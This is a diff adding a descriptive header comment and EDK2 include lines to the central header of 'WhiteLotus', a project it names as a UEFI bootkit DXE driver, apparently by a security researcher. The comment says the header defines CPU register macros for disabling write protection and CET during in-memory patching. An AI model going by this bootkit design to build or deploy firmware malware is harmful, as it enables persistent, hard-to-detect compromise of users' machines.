@@ -1,3 +1,28 @@
+/*
+ * ============================================================
+ *  Project  : WhiteLotus — UEFI Bootkit DXE Driver
+ *  File     : WhiteLotus.h
+ * ============================================================
+ *
+ *  Description:
+ *    Central project header. Aggregates all UEFI/EDK2 library
+ *    includes, CPU control register constant definitions
+ *    (CR0.WP, CR4.CET, MSR_EFER, EFER_LMA, EFER_UAIE), and
+ *    shared type/function declarations used across every
+ *    module of the DXE driver.
+ *
+ *  Purpose:
+ *    - Provide a single include point for all driver modules.
+ *    - Define CPU register macros required for write-protect
+ *      and CET manipulation during in-memory patching.
+ *
+ *  Author   : 0xbekoo
+ *  Blog     : https://0xbekoo.github.io
+ *  Updated  : 2026-05-21
+ *
+ * ============================================================
+ */
+
 #include <Uefi.h>
 #include <Library/UefiLib.h>
 #include <Library/UefiDriverEntryPoint.h>
